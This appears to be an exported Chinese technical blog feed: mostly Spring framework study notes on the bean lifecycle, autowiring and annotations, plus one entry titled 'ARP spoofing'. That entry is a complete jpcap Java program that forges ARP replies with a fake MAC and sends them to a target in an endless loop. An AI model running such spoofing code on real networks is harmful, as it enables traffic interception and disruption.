context =</span><span class="token comment" spellcheck="true">// new ClassPathXmlApplicationContext("bean4.xml");</span>    ClassPathXmlApplicationContext context <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"bean4.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Orders orders <span class="token operator">=</span> context<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"orders"</span><span class="token punctuation">,</span> Orders<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"第四步 获取创建 bean 实例对象"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>orders<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//手动让 bean 实例销毁</span>    context<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml">//initmethod指定初始化方法，destroy-method指定销毁方法<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orders<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.bean.Orders<span class="token punctuation">"</span></span> <span class="token attr-name">initmethod</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>initMethod<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>destroyMethod<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>oname<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>手机<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//bean 的后置处理器， bean 生命周期有七步</span>（<span class="token number">1</span>）通过构造器创建 bean 实例（无参数构造）（<span class="token number">2</span>）为 bean 的属性设置值和对其他 bean 引用（调用 set 方法）（<span class="token number">3</span>）把 bean 实例传递 bean 后置处理器的方法 postProcessBeforeInitialization（<span class="token number">4</span>）调用 bean 的初始化的方法（需要进行配置初始化的方法）（<span class="token number">5</span>）把 bean 实例传递 bean 后置处理器的方法 postProcessAfterInitialization（<span class="token number">6</span>） bean 可以使用了（对象获取到了）（<span class="token number">7</span>）当容器关闭时候，调用 bean 的销毁的方法（需要进行配置销毁的方法）    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyBeanPost</span> <span class="token keyword">implements</span> <span class="token class-name">BeanPostProcessor</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Object <span class="token function">postProcessBeforeInitialization</span><span class="token punctuation">(</span>Object bean<span class="token punctuation">,</span> String beanName<span class="token punctuation">)</span>        <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"在初始化之前执行的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> bean<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> Object <span class="token function">postProcessAfterInitialization</span><span class="token punctuation">(</span>Object bean<span class="token punctuation">,</span> String beanName<span class="token punctuation">)</span>        <span class="token keyword">throws</span> BeansException <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"在初始化之后执行的方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> bean<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>MyBeanPost<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.xx.MyBeanPost<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>执行结果</p><pre><code>第一步 执行无参数构造创建 bean 实例第二步 调用 set 方法设置属性值在初始化之前执行的方法第三步 执行初始化的方法在初始化之后执行的方法第四步 获取创建 bean 实例对象第五步 执行销毁的方法</code></pre><h4 id="2-哪些是重要的bean生命周期方法？-你能重载它们吗？"><a href="#2-哪些是重要的bean生命周期方法？-你能重载它们吗？" class="headerlink" title="2.哪些是重要的bean生命周期方法？ 你能重载它们吗？"></a>2.哪些是重要的bean生命周期方法？ 你能重载它们吗？</h4><p>有两个重要的bean 生命周期方法，第一个是<strong>setup</strong> ， 它是在容器加载bean的时候被调用。第二个方法是 <strong>teardown</strong> 它是在容器卸载类的时候被调用。</p><p>The bean 标签有两个重要的属性（init-method和destroy-method）。用它们你可以自己定制初始化和注销方法。它们也有相应的注解（@PostConstruct和@PreDestroy）。</p><h3 id="六、Spring-Bean自动装配"><a href="#六、Spring-Bean自动装配" class="headerlink" title="六、Spring Bean自动装配"></a>六、Spring Bean自动装配</h3><h4 id="1、什么是bean装配"><a href="#1、什么是bean装配" class="headerlink" title="1、什么是bean装配?"></a>1、什么是bean装配?</h4><p>装配，或bean 装配是指在Spring 容器中把bean组装到一起，前提是容器需要知道bean的依赖关系，如何通过依赖注入来把它们装配到一起。</p><h4 id="2、什么是bean的自动装配？"><a href="#2、什么是bean的自动装配？" class="headerlink" title="2、什么是bean的自动装配？"></a>2、什么是bean的自动装配？</h4><p>Spring 容器能够自动装配相互合作的bean，这意味着容器不需要和配置，能通过Bean工厂自动处理bean之间的协作。</p><p>根据指定装配规则（属性名称或者属性类型），spring自动将匹配的属性值进行注入</p><h4 id="3、解释不同方式的自动装配-。"><a href="#3、解释不同方式的自动装配-。" class="headerlink" title="3、解释不同方式的自动装配 。"></a>3、解释不同方式的自动装配 。</h4><p>有五种自动装配的方式，可以用来指导Spring容器用自动装配方式来进行依赖注入。</p><p><strong>no</strong>：默认的方式是不进行自动装配，通过显式设置ref 属性来进行装配。<br><strong>byName</strong>：通过参数名自动装配，Spring容器在配置文件中发现bean的autowire属性被设置成byname，之后容器试图匹配、装配和该bean的属性具有相同名字的bean。<br><strong>byType</strong>：通过参数类型自动装配，Spring容器在配置文件中发现bean的autowire属性被设置成byType，之后容器试图匹配、装配和该bean的属性具有相同类型的bean。如果有多个bean符合条件，则抛出错误。<br><strong>constructor</strong>：这个方式类似于byType， 但是要提供给构造器参数，如果没有确定的带参数的构造器参数类型，将会抛出异常。<br><strong>autodetect</strong>：首先尝试使用constructor来自动装配，如果无法工作，则使用byType方式。</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--实现自动装配bean 标签属性 autowire，配置自动装配autowire 属性常用两个值：byName 根据属性名称注入 ，注入值 bean 的 id 值和类属性名称一样byType 根据属性类型注入,如果有多个改类型的bean，会引发报错，因为找不到匹配的bean--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>emp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.autowire.Emp<span class="token punctuation">"</span></span> <span class="token attr-name">autowire</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>byName<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--&lt;property name="dept" ref="dept">&lt;/property>--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dept<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu.spring5.autowire.Dept<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h4 id="4、自动装配有哪些局限性"><a href="#4、自动装配有哪些局限性" class="headerlink" title="4、自动装配有哪些局限性 ?"></a>4、自动装配有哪些局限性 ?</h4><p>自动装配的局限性是：</p><p><strong>重写</strong>： 你仍需用 和 配置来定义依赖，意味着总要重写自动装配。</p><p> <strong>基本数据类型</strong>：你不能自动装配简单的属性，如基本数据类型，String字符串，和类。<br> <strong>模糊特性</strong>：自动装配不如显式装配精确，如果有可能，建议使用显式装配。</p><h4 id="5、你可以在Spring中注入一个null-和一个空字符串吗？"><a href="#5、你可以在Spring中注入一个null-和一个空字符串吗？" class="headerlink" title="5、你可以在Spring中注入一个null 和一个空字符串吗？"></a>5、你可以在Spring中注入一个null 和一个空字符串吗？</h4><p>可以。</p><h3 id="七、引入外部文件"><a href="#七、引入外部文件" class="headerlink" title="七、引入外部文件"></a>七、引入外部文件</h3><pre class=" language-xml"><code class="language-xml">引入 context 名称空间&lt;beans xmlns="http://www.springframework.org/schema/beans"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"xmlns:p="http://www.springframework.org/schema/p"xmlns:util="http://www.springframework.org/schema/util"xmlns:context="http://www.springframework.org/schema/context"xsi:schemaLocation="http://www.springframework.org/schema/beanshttp://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/utilhttp://www.springframework.org/schema/util/spring-util.xsdhttp://www.springframework.org/schema/contexthttp://www.springframework.org/schema/context/spring-context.xsd"> 在 spring 配置文件使用标签引入外部属性文件<span class="token comment" spellcheck="true">&lt;!--引入外部属性文件--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>classpath:jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!--配置连接池--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.alibaba.druid.pool.DruidDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>driverClassName<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${prop.driverClass}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${prop.url}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${prop.userName}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>${prop.password}<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h3 id="八、Spring注解"><a href="#八、Spring注解" class="headerlink" title="八、Spring注解"></a>八、Spring注解</h3><h4 id="1、什么是注解"><a href="#1、什么是注解" class="headerlink" title="1、什么是注解"></a>1、什么是注解</h4><p>（1）注解是代码特殊标记，格式： @注解名称(属性名称=属性值, 属性名称=属性值..) </p><p>（2）使用注解，注解作用在类上面，方法上面，属性上面 </p><p>（3）使用注解目的：简化 xml 配置</p><h4 id="2、什么是基于Java的Spring注解配置-给一些注解的例子"><a href="#2、什么是基于Java的Spring注解配置-给一些注解的例子" class="headerlink" title="2、什么是基于Java的Spring注解配置? 给一些注解的例子."></a>2、什么是基于Java的Spring注解配置? 给一些注解的例子.</h4><p>基于Java的配置，允许你在少量的Java注解的帮助下，进行你的大部分Spring配置而非通过XML文件。</p><p>以@Configuration 注解为例，它用来标记类可以当做一个bean的定义，被Spring IOC容器使用。另一个例子是@Bean注解，它表示此方法将要返回一个对象，作为一个bean注册进Spring应用上下文。</p><h4 id="3、Spring-针对-Bean-管理中创建对象提供注解"><a href="#3、Spring-针对-Bean-管理中创建对象提供注解" class="headerlink" title="3、Spring 针对 Bean 管理中创建对象提供注解"></a>3、Spring 针对 Bean 管理中创建对象提供注解</h4><p> （1） @Component<br> （2） @Service<br> （3） @Controller<br> （4） @Repository</p><ul><li>上面四个注解功能是一样的，都可以用来创建bean 实例，只是名字便于区分</li></ul><h4 id="4、什么是基于注解的容器配置"><a href="#4、什么是基于注解的容器配置" class="headerlink" title="4、什么是基于注解的容器配置?"></a>4、什么是基于注解的容器配置?</h4><p>相对于XML文件，注解型的配置依赖于通过字节码元数据装配组件，而非尖括号的声明。</p><p>开发者通过在相应的类，方法或属性上使用注解的方式，直接组件类中进行配置，而不是使用xml表述bean的装配关系。</p><h4 id="5、怎样开启注解装配？"><a href="#5、怎样开启注解装配？" class="headerlink" title="5、怎样开启注解装配？"></a>5、怎样开启注解装配？</h4><p>注解装配在默认情况下是不开启的，为了使用注解装配，我们必须在Spring配置文件中配置 context:annotation-config/元素。</p><h4 id="6、-Required-注解"><a href="#6、-Required-注解" class="headerlink" title="6、@Required 注解"></a>6、@Required 注解</h4><p>这个注解表明bean的属性必须在配置的时候设置，通过一个bean定义的显式的属性值或通过自动装配，若@Required注解的bean属性未被设置，容器将抛出BeanInitializationException。</p><h4 id="7、-Autowired-注解"><a href="#7、-Autowired-注解" class="headerlink" title="7、@Autowired 注解"></a>7、@Autowired 注解</h4><p>@Autowired 注解提供了更细粒度的控制，包括在何处以及如何完成自动装配。它的用法和@Required一样，修饰setter方法、构造器、属性或者具有任意名称和/或多个参数的PN方法。</p><h4 id="8、-Qualifier-注解"><a href="#8、-Qualifier-注解" class="headerlink" title="8、@Qualifier 注解"></a>8、@Qualifier 注解</h4><p>当有多个相同类型的bean却只有一个需要自动装配时，将@Qualifier 注解和@Autowire 注解结合使用以消除这种混淆，指定需要装配的确切的bean。</p><h4 id="9、-value注解"><a href="#9、-value注解" class="headerlink" title="9、@value注解"></a>9、@value注解</h4><p>该注解的作用是将我们配置文件的属性读出来，有<strong>@Value(“${}”)</strong>和<strong>@Value(“#{}”)</strong>两种方式</p><pre><code>① ${ property : default_value }② #{ obj.property? :default_value }第一个注入的是外部配置文件对应的property，第二个则是SpEL表达式对应的内容。 那个default_value，就是前面的值为空时的默认值。注意二者的不同，#{}里面那个obj代表对象。</code></pre><h4 id="10、案例演示"><a href="#10、案例演示" class="headerlink" title="10、案例演示"></a>10、案例演示</h4><p>1.引入依赖<code>spring-aop-5.2.6.RELEASE.jar</code></p><p>2.开启组件扫描</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--开启组件扫描1 如果扫描多个包，多个包使用逗号隔开2 扫描包上层目录--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span></code></pre><p>3.创建类，在类上面添加创建对象注解</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//在注解里面 value 属性值可以省略不写，</span><span class="token comment" spellcheck="true">//默认值是类名称，首字母小写</span><span class="token comment" spellcheck="true">//UserService -- userService@Component(value = "userService") //&lt;bean id="userService" class=".."/></span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service add......."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>4.开启组件扫描细节配置</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--示例 1use-default-filters="false" 表示现在不使用默认 filter，自己配置 filtercontext:include-filter ，设置扫描哪些内容--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu<span class="token punctuation">"</span></span> <span class="token attr-name">use-defaultfilters</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>include-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span>    <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Controller<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--示例 2下面配置扫描包所有内容context:exclude-filter： 设置哪些内容不进行扫描--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atguigu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>exclude-filter</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>annotation<span class="token punctuation">"</span></span>    <span class="token attr-name">expression</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>org.springframework.stereotype.Controller<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span></code></pre><p>5.基于注解方式实现属性注入</p><p>（1） @Autowired：根据属性类型进行自动装配 </p><p>第一步 把 service 和 dao 对象创建，在 service 和 dao 类添加创建对象注解 </p><p>第二步 在 service 注入 dao 对象，在 service 类添加 dao 类型属性，在属性上面使用注解</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Service</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UserService</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//定义 dao 类型属性</span><span class="token comment" spellcheck="true">//不需要添加 set 方法</span><span class="token comment" spellcheck="true">//添加注入属性注解</span>    <span class="token annotation punctuation">@Autowired</span>    <span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service add......."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        userDao<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>（2） @Qualifier：根据名称进行注入 这个@Qualifier 注解的使用，和上面@Autowired 一起使用</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//定义 dao 类型属性</span><span class="token comment" spellcheck="true">//不需要添加 set 方法//添加注入属性注解</span><span class="token annotation punctuation">@Autowired</span> <span class="token comment" spellcheck="true">//根据类型进行注入</span><span class="token annotation punctuation">@Qualifier</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"userDaoImpl1"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//根据名称进行注入</span><span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span></code></pre><p>（3） @Resource：可以根据类型注入，可以根据名称注入</p><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//@Resource //根据类型进行注入</span><span class="token annotation punctuation">@Resource</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"userDaoImpl1"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//根据名称进行注入</span><span class="token keyword">private</span> UserDao userDao<span class="token punctuation">;</span></code></pre><p>（4） @Value：注入普通类型属性</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Value</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token keyword">private</span> String</code></pre><h4 id="6-完全注解开发"><a href="#6-完全注解开发" class="headerlink" title="6.完全注解开发"></a>6.完全注解开发</h4><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Configuration</span> <span class="token comment" spellcheck="true">//作为配置类，替代 xml 配置文件</span><span class="token annotation punctuation">@ComponentScan</span><span class="token punctuation">(</span>basePackages <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"com.atguigu"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//扫描的包</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringConfig</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -后端 -spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arp欺骗</title>
      <link href="/2020/09/14/arp-qi-pian/"/>
      <url>/2020/09/14/arp-qi-pian/</url>
      
        <content type="html"><![CDATA[<pre><code>package com.test.arp;import java.net.InetAddress;import jpcap.JpcapCaptor;import jpcap.JpcapSender;import jpcap.NetworkInterface;import jpcap.packet.ARPPacket;import jpcap.packet.EthernetPacket;public class SendFakeARP {    static byte[] stomac(String s) {        byte[] mac = new byte[] { (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00 };        String[] s1 = s.split(&quot;-&quot;);        for (int x = 0; x &lt; s1.length; x++) {            mac[x] = (byte) ((Integer.parseInt(s1[x], 16)) &amp; 0xff);        }        return mac;    }    public static void main(String[] args) throws Exception {        int time = 2;  // 重发间隔时间        InetAddress desip = InetAddress.getByName(&quot;192.168.1.2&quot;);// 被欺骗的目标IP地址        byte[] desmac = stomac(&quot;01-1c-23-3c-51-cf&quot;);// 被欺骗的目标目标MAC数组        InetAddress srcip = InetAddress.getByName(&quot;192.168.1.3&quot;);// 源IP地址        byte[] srcmac = stomac(&quot;00-1C-13-2E-A8-0A&quot;); // 假的MAC数组        // 枚举网卡并打开设备        NetworkInterface[] devices = JpcapCaptor.getDeviceList();        NetworkInterface device = devices[1];        JpcapSender sender = JpcapSender.openDevice(device);        // 设置ARP包        ARPPacket arp = new ARPPacket();        arp.hardtype = ARPPacket.HARDTYPE_ETHER;        arp.prototype = ARPPacket.PROTOTYPE_IP;        arp.operation = ARPPacket.ARP_REPLY;        arp.hlen = 6;        arp.plen = 4;        arp.sender_hardaddr = srcmac;        arp.sender_protoaddr = srcip.getAddress();        arp.target_hardaddr = desmac;        arp.target_protoaddr = desip.getAddress();        // 设置DLC帧        EthernetPacket ether = new EthernetPacket();        ether.frametype = EthernetPacket.ETHERTYPE_ARP;        ether.src_mac = srcmac;        ether.dst_mac = desmac;        arp.datalink = ether;        // 发送ARP应答包        while (true) {            System.out.println(&quot;sending arp..&quot;);            sender.sendPacket(arp);            Thread.sleep(time * 1000);        }    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 技能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring</title>
      <link href="/2020/09/05/spring/"/>
      <url>/2020/09/05/spring/</url>
      
        <content type="html"><![CDATA[<h3 id="一、spring简介"><a href="#一、spring简介" class="headerlink" title="一、spring简介"></a>一、spring简介</h3><p>Spring是一个轻量级的控制反转(IoC)和面向切面(AOP)的容器框架。</p><p>目的：解决企业应用开发的复杂性</p><p>Spring框架主要由七部分组成，分别是 Spring Core、 Spring AOP、 Spring ORM、 Spring DAO、Spring Context、 Spring Web和 Spring Web MVC。</p><p><img src="assets/image-20220220132625160.png" alt="image-20220220132625160"></p><h4 id="1-Spring有哪些优点？（面试题）"><a href="#1-Spring有哪些优点？（面试题）" class="headerlink" title="1.Spring有哪些优点？（面试题）"></a>1.Spring有哪些优点？（面试题）</h4><p><strong>轻量级</strong>：Spring在大小和透明性方面绝对属于轻量级的，基础版本的Spring框架大约只有2MB。</p><p><strong>控制反转(IoC)</strong>：Spring使用控制反转技术实现了松耦合。依赖被注入到对象，而不是创建或寻找依赖对象。</p><p><strong>面向切面编程(AOP)</strong>： Spring支持面向切面编程，同时把应用的业务逻辑与系统的服务分离开来。</p><p><strong>容器</strong>：Spring包含并管理应用程序对象的配置及生命周期。</p><p><strong>MVC框架</strong>：Spring的web框架是一个设计优良的web MVC框架，很好的取代了一些web框架。</p><p><strong>事务管理</strong>：Spring对下至本地业务上至全局业务(JAT)提供了统一的事务管理接口。</p><p><strong>异常处理</strong>：Spring提供一个方便的API将特定技术的异常(由JDBC, Hibernate, 或JDO抛出)转化为一致的、Unchecked异常。</p><h4 id="2-Spring-有两个核心部分：IoC-和AOP"><a href="#2-Spring-有两个核心部分：IoC-和AOP" class="headerlink" title="2.Spring 有两个核心部分：IoC 和AOP"></a>2.Spring 有两个核心部分：IoC 和AOP</h4><p>(1)IOC:控制反转，把创建对象交给spring进行管理</p><p>(2)AOP：面向切面，不修改源代码进行功能增强</p><h4 id="3-Spring-特点"><a href="#3-Spring-特点" class="headerlink" title="3.Spring 特点"></a>3.Spring 特点</h4><pre><code>    （1）    方便解耦，简化开发    （2）    Aop编程支持    （3）    方便程序测试    （4）    方便和其他框架进行整合    （5）    方便进行事务操作    （6）    降低 API开发难度</code></pre><h4 id="4-下载spring"><a href="#4-下载spring" class="headerlink" title="4.下载spring"></a>4.下载spring</h4><p><a href="https://repo.spring.io/release/org/springframework/spring/" target="_blank" rel="noopener">https://repo.spring.io/release/org/springframework/spring/</a></p><h3 id="二、IOC"><a href="#二、IOC" class="headerlink" title="二、IOC"></a>二、IOC</h3><h4 id="1、什么是-IOC"><a href="#1、什么是-IOC" class="headerlink" title="1、什么是 IOC"></a>1、什么是 IOC</h4><p>（1）控制反转，把对象创建和对象之间的调用过程，交给 Spring 进行管理 </p><p>（2）使用 IOC 目的：为了耦合度降低 </p><p>Spring IOC 负责创建对象，管理对象（通过依赖注入（DI），装配对象，配置对象，并且管理这些对象的整个生命周期。</p><p>使用IOC目的：为了降低耦合度</p><h4 id="2、IOC底层（面试）"><a href="#2、IOC底层（面试）" class="headerlink" 